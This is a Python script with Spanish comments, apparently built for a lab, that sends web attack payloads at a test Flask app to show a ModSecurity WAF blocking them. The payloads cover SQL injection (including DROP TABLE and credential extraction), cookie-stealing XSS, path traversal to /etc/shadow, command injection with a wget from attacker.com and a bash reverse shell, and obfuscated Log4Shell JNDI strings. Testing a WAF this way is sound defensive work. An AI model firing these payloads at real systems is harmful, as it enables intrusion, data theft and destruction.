#!/usr/bin/env python3
"""
Script de ataque web para demostracion WAF.
Prueba vectores de ataque contra la aplicacion Flask protegida y sin proteger.
Compatible con el escenario Mininet WAF + ModSecurity.
"""

import sys
import os
import time
import argparse
import urllib.request
import urllib.parse
import urllib.error
from datetime import datetime

# Configuracion por defecto
TARGET_HOST = '10.0.2.80'
TARGET_PORT = 80

# Estadisticas
stats = {
    'total': 0, 'blocked': 0, 'bypass': 0, 'errors': 0,
    'sqli': 0, 'xss': 0, 'traversal': 0, 'cmd': 0, 'otros': 0
}


def ts():
    return datetime.now().strftime('%H:%M:%S')


def print_header(target, port):
    print('\n' + '=' * 65)
    print('  SCRIPT DE ATAQUE WEB - DEMOSTRACION WAF')
    print('=' * 65)
    print(f'  Objetivo:    http://{target}:{port}/')
    print(f'  Inicio:      {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')
    print()
    if port == 80:
        print('  [WAF ACTIVO]  Los ataques deben ser BLOQUEADOS (HTTP 403)')
    else:
        print('  [SIN WAF]     Los ataques deben llegar al backend (HTTP 200)')
    print('=' * 65 + '\n')


def request(url, method='GET', data=None, timeout=5):
    """Realiza peticion HTTP. Retorna (status, body_excerpt, waf_action)."""
    stats['total'] += 1
    try:
        req = urllib.request.Request(
            url,
            data=data.encode('utf-8') if data else None,
            method=method
        )
        req.add_header('User-Agent', 'WAF-Demo-Tester/1.0')
        if data:
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')

        with urllib.request.urlopen(req, timeout=timeout) as resp:
            waf = resp.headers.get('X-WAF-Action', '-')
            body = resp.read(300).decode('utf-8', errors='replace')
            return resp.status, body, waf

    except urllib.error.HTTPError as e:
        waf = e.headers.get('X-WAF-Action', '-') if hasattr(e, 'headers') else '-'
        try:
            body = e.read(200).decode('utf-8', errors='replace')
        except Exception:
            body = str(e)
        return e.code, body, waf

    except Exception as e:
        stats['errors'] += 1
        return 0, str(e), 'ERROR'


def log_result(nombre, url, status, waf, categoria='otros', payload=''):
    if status == 403:
        stats['blocked'] += 1
        stats[categoria] += 1
        estado = f'[BLOQUEADO]  HTTP 403 (WAF OK)'
    elif status == 0:
        estado = f'[ERROR]      Sin respuesta del servidor'
    elif 200 <= status < 400:
        stats['bypass'] += 1
        if waf == 'ALLOWED':
            estado = f'[PERMITIDO]  HTTP {status} (peticion limpia)'
        else:
            estado = f'[!! BYPASS]  HTTP {status} - EL ATAQUE PASO EL WAF!'
    else:
        estado = f'[HTTP {status}]'

    print(f'  [{ts()}] {nombre}')
    if payload:
        print(f'           Payload: {payload[:60]}')
    print(f'           URL:     {url[:75]}')
    print(f'           Result:  {estado} | WAF:{waf}')
    print()


# ----------------------------------------------------------------
# Peticiones legitimas
# ----------------------------------------------------------------
def test_legitimas(target, port):
    print('[*] ====== PETICIONES LEGITIMAS (deben ser PERMITIDAS) ======')
    base = f'http://{target}:{port}'

    casos = [
        ('Pagina principal',       'GET',  '/',                        None),
        ('Busqueda normal',        'GET',  '/buscar?q=python+tutorial', None),
        ('Login valido',           'POST', '/login',                   'user=admin&pass=admin123'),
        ('Login invalido',         'POST', '/login',                   'user=usuario&pass=clave'),
        ('Descarga archivo normal','GET',  '/archivo?f=manual.pdf',    None),
        ('Ping host valido',       'GET',  '/ping?host=8.8.8.8',       None),
        ('API info',               'GET',  '/api/info',                None),
    ]

    for nombre, method, path, data in casos:
        url = base + path
        status, body, waf = request(url, method=method, data=data)
        log_result(nombre, url, status, waf, categoria='otros', payload=data or '')
        time.sleep(0.2)


# ----------------------------------------------------------------
# SQL Injection
# ----------------------------------------------------------------
def attack_sqli(target, port):
    print('[*] ====== SQL INJECTION (OWASP CRS 942xxx) ======')
    base = f'http://{target}:{port}'

    payloads = [
        ("Classic OR bypass",          "/login?user=admin'+OR+'1'='1&pass=x"),
        ("UNION SELECT extraction",    "/buscar?q=1'+UNION+SELECT+username,password+FROM+users--"),
        ("Stacked queries DROP TABLE", "/buscar?q=1';DROP+TABLE+users;--"),
        ("Blind SQLi SLEEP(5)",        "/buscar?q=1'+AND+SLEEP(5)--"),
        ("Error-based EXTRACTVALUE",   "/buscar?q=1'+AND+EXTRACTVALUE(1,CONCAT(0x7e,version()))--"),
        ("Comment bypass --",          "/login?user=admin'--&pass=cualquier"),
        ("Boolean blind",              "/buscar?q=1'+AND+1=1--"),
        ("Schema enumeration",         "/buscar?q=1+UNION+SELECT+table_name+FROM+information_schema.tables"),
        ("xp_cmdshell RCE",            "/buscar?q=1;EXEC+xp_cmdshell('id')--"),
        ("WAITFOR DELAY mssql",        "/buscar?q=1;WAITFOR+DELAY+'0:0:5'--"),
    ]

    for nombre, path in payloads:
        url = base + path
        status, body, waf = request(url)
        log_result(f'SQLi: {nombre}', url, status, waf, categoria='sqli',
                   payload=urllib.parse.unquote(path))
        time.sleep(0.25)


# ----------------------------------------------------------------
# Cross-Site Scripting
# ----------------------------------------------------------------
def attack_xss(target, port):
    print('[*] ====== CROSS-SITE SCRIPTING - XSS (OWASP CRS 941xxx) ======')
    base = f'http://{target}:{port}'

    payloads = [
        ("Script tag basico",         "/buscar?q=<script>alert('XSS')</script>"),
        ("IMG onerror",               "/buscar?q=<img+src=x+onerror=alert(document.cookie)>"),
        ("SVG onload",                "/buscar?q=<svg/onload=alert(1)>"),
        ("Iframe javascript",         "/buscar?q=<iframe+src=javascript:alert(1)>"),
        ("Body onload",               "/buscar?q=<body+onload=alert(1)>"),
        ("Anchor javascript URI",     "/buscar?q=<a+href=javascript:alert(1)>click</a>"),
        ("Encoded %3C%3E",            "/buscar?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"),
        ("Input onfocus",             "/buscar?q=<input+onfocus=alert(1)+autofocus>"),
        ("Expression CSS",            "/buscar?q=<style>body{background:expression(alert(1))}</style>"),
        ("IMG src onerror POST",      "/login", "user=<img onerror=alert(1) src=x>&pass=x"),
    ]

    for item in payloads:
        nombre  = item[0]
        path    = item[1]
        data    = item[2] if len(item) > 2 else None
        method  = 'POST' if data else 'GET'
        url     = base + path
        status, body, waf = request(url, method=method, data=data)
        log_result(f'XSS: {nombre}', url, status, waf, categoria='xss',
                   payload=data or urllib.parse.unquote(path))
        time.sleep(0.25)


# ----------------------------------------------------------------
# Path Traversal / LFI
# ----------------------------------------------------------------
def attack_traversal(target, port):
    print('[*] ====== PATH TRAVERSAL / LFI (OWASP CRS 930xxx) ======')
    base = f'http://{target}:{port}'

    payloads = [
        ("Unix /etc/passwd",           "/archivo?f=../../../etc/passwd"),
        ("Unix /etc/shadow",           "/archivo?f=../../../etc/shadow"),
        ("URL encoded dots",           "/archivo?f=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
        ("Double encode",              "/archivo?f=%252e%252e%252fetc%252fpasswd"),
        ("Backslash Windows",          "/archivo?f=..\\..\\..\\windows\\win.ini"),
        ("/proc/self/environ",         "/archivo?f=../../../proc/self/environ"),
        ("Null byte bypass",           "/archivo?f=../../../etc/passwd%00.jpg"),
        ("Nested traversal ....//",    "/archivo?f=....//....//....//etc/passwd"),
        ("Mixed slash",                "/archivo?f=..%2F..%2F..%2Fetc/passwd"),
        ("Busqueda LFI",               "/buscar?q=../../../../etc/passwd"),
    ]

    for nombre, path in payloads:
        url = base + path
        status, body, waf = request(url)
        log_result(f'LFI: {nombre}', url, status, waf, categoria='traversal',
                   payload=urllib.parse.unquote(path))
        time.sleep(0.25)


# ----------------------------------------------------------------
# Command Injection
# ----------------------------------------------------------------
def attack_cmd(target, port):
    print('[*] ====== COMMAND INJECTION (OWASP CRS 932xxx) ======')
    base = f'http://{target}:{port}'

    payloads = [
        ("Semicolon Unix",             "/ping?host=127.0.0.1;cat+/etc/passwd"),
        ("Pipe id",                    "/ping?host=127.0.0.1|id"),
        ("Ampersand background",       "/ping?host=127.0.0.1&ls+-la"),
        ("Backtick substitution",      "/ping?host=`whoami`"),
        ("Newline injection",          "/ping?host=127.0.0.1%0aid"),
        ("Logical AND",                "/ping?host=127.0.0.1&&cat+/etc/shadow"),
        ("OR command",                 "/ping?host=0||id"),
        ("Dollar substitution",        "/ping?host=$(id)"),
        ("Wget exfiltration",          "/ping?host=127.0.0.1;wget+http://attacker.com/shell.sh"),
        ("Bash reverse shell",         "/ping?host=127.0.0.1;bash+-i+>&+/dev/tcp/10.0.2.20/4444+0>&1"),
    ]

    for nombre, path in payloads:
        url = base + path
        status, body, waf = request(url)
        log_result(f'CMDi: {nombre}', url, status, waf, categoria='cmd',
                   payload=urllib.parse.unquote(path))
        time.sleep(0.25)


# ----------------------------------------------------------------
# Log4Shell
# ----------------------------------------------------------------
def attack_log4shell(target, port):
    print('[*] ====== LOG4SHELL CVE-2021-44228 ======')
    base = f'http://{target}:{port}'

    payloads = [
        ("JNDI LDAP basico",           "/buscar?q=${jndi:ldap://attacker.com/a}"),
        ("JNDI RMI",                   "/buscar?q=${jndi:rmi://attacker.com/a}"),
        ("JNDI DNS",                   "/buscar?q=${jndi:dns://attacker.com/a}"),
        ("Obfuscado lower",            "/buscar?q=${${lower:j}ndi:ldap://attacker.com}"),
        ("Obfuscado upper",            "/buscar?q=${${upper:j}NDI:ldap://attacker.com}"),
        ("Header User-Agent",          "/buscar?q=test"),  # Payload en header
    ]

    # Caso especial: inyeccion via User-Agent
    url_ua = f"{base}/buscar?q=test"
    stats['total'] += 1
    try:
        req = urllib.request.Request(url_ua, method='GET')
        req.add_header('User-Agent', '${jndi:ldap://attacker.com/exploit}')
        with urllib.request.urlopen(req, timeout=5) as resp:
            waf = resp.headers.get('X-WAF-Action', '-')
            status = resp.status
    except urllib.error.HTTPError as e:
        status = e.code
        waf = e.headers.get('X-WAF-Action', '-') if hasattr(e, 'headers') else '-'
    except Exception:
        status = 0
        waf = 'ERROR'
    log_result('Log4Shell: Header User-Agent', url_ua, status, waf,
               categoria='otros', payload='User-Agent: ${jndi:ldap://attacker.com/exploit}')

    for nombre, path in payloads[:-1]:
        url = base + path
        status, body, waf = request(url)
        log_result(f'Log4Shell: {nombre}', url, status, waf, categoria='otros',
                   payload=urllib.parse.unquote(path))
        time.sleep(0.25)


# ----------------------------------------------------------------
# Resumen final
# ----------------------------------------------------------------
def print_resumen(target, port):
    print('\n' + '=' * 65)
    print('  RESUMEN DEL ATAQUE')
    print('=' * 65)
    print(f'  Objetivo:              http://{target}:{port}/')
    print(f'  Total peticiones:      {stats["total"]}')
    print(f'  Peticiones BLOQUEADAS: {stats["blocked"]}  (HTTP 403)')
    print(f'  Peticiones BYPASS:     {stats["bypass"]}   (pasaron el WAF)')
    print(f'  Errores:               {stats["errors"]}')
    print()
    print(f'  Desglose bloqueados:')
    print(f'    SQL Injection:       {stats["sqli"]}')
    print(f'    XSS:                 {stats["xss"]}')
    print(f'    Path Traversal:      {stats["traversal"]}')
    print(f'    Command Injection:   {stats["cmd"]}')
    print()
    if stats['bypass'] > 0:
        print(f'  [!] ADVERTENCIA: {stats["bypass"]} peticion(es) pasaron el WAF!')
        print(f'      (Peticiones legitimas o falsos negativos)')
    else:
        print(f'  [OK] Todos los ataques detectados fueron bloqueados.')
    print('=' * 65 + '\n')


# ----------------------------------------------------------------
# Main
# ----------------------------------------------------------------
if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Web Attacker - Demostracion WAF + ModSecurity',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
Ejemplos:
  python3 web_attacker.py --target 10.0.2.80 --all            # Via WAF (bloqueados)
  python3 web_attacker.py --target 10.0.2.90 --port 5000 --all # Sin WAF (bypass)
  python3 web_attacker.py --target 10.0.2.80 --sqli --xss     # Solo SQLi y XSS
  python3 web_attacker.py --target 10.0.2.80 --legit          # Solo peticiones limpias
"""
    )
    parser.add_argument('--target',    default=TARGET_HOST, help='IP del objetivo')
    parser.add_argument('--port',      type=int, default=TARGET_PORT, help='Puerto')
    parser.add_argument('--all',       action='store_true', help='Todos los ataques')
    parser.add_argument('--legit',     action='store_true', help='Peticiones legitimas')
    parser.add_argument('--sqli',      action='store_true', help='SQL Injection')
    parser.add_argument('--xss',       action='store_true', help='Cross-Site Scripting')
    parser.add_argument('--traversal', action='store_true', help='Path Traversal / LFI')
    parser.add_argument('--cmd',       action='store_true', help='Command Injection')
    parser.add_argument('--log4shell', action='store_true', help='Log4Shell CVE-2021-44228')
    args = parser.parse_args()

    run_all = args.all

    print_header(args.target, args.port)

    if args.legit or run_all:
        test_legitimas(args.target, args.port)

    if args.sqli or run_all:
        attack_sqli(args.target, args.port)

    if args.xss or run_all:
        attack_xss(args.target, args.port)

    if args.traversal or run_all:
        attack_traversal(args.target, args.port)

    if args.cmd or run_all:
        attack_cmd(args.target, args.port)

    if args.log4shell or run_all:
        attack_log4shell(args.target, args.port)

    if not any([args.legit, args.sqli, args.xss, args.traversal,
                args.cmd, args.log4shell, run_all]):
        print('[!] Selecciona al menos una opcion:')
        print('    --all, --legit, --sqli, --xss, --traversal, --cmd, --log4shell')
        sys.exit(1)

    print_resumen(args.target, args.port)
